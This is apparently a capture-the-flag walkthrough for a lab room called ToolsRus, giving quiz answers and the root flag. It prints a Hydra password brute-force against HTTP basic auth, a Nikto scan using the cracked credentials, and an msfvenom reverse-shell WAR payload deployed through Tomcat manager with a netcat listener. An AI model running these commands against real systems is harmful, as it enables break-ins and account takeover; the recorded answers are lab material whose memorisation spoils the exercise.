# ToolsRus

---

> What directory can you find, that begins with a "g"?

`guidelines`

> Whose name can you find from this directory?

`bob`

> What directory has basic authentication?

`protected`

> What is bob's password to the protected part of the website?

`bubbles`

// Defeating HTTP Basic Auth with Hydra

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.165.186 http-get /protected

[80][http-get] host: 10.10.165.186   login: bob   password: bubbles
```

> What other port that serves a webs service is open on the machine?

`1234`

> What is the name and version of the software running on the port from question 5?

`Apache Tomcat/7.0.88`

> Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

How many documentation files did Nikto identify?

`5`

`nikto -h http://10.10.165.186:1234/manager/html/ -id bob:bubbles`

> What is the server version?

`Apache/2.4.18`

> What version of Apache-Coyote is this service using?

`1.1`

> Use Metasploit to exploit the service and get a shell on the system.

What user did you get a shell as?

`root`

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.96.175 LPORT=4444 -f war > exploit.war

upload and deploy `exploit.war` in `Deploy` section under `/manager/html`

Then, we will get a new entry `/exploit` in `Applications` section under `/manager/html`

$ nc -lnvp 4444

move to `http://10.10.165.186:1234/exploit/`

Got Shell!
```


> What flag is found in the root directory?

`ff1fc4a81affcc7688cf89ae7dc6e0e1`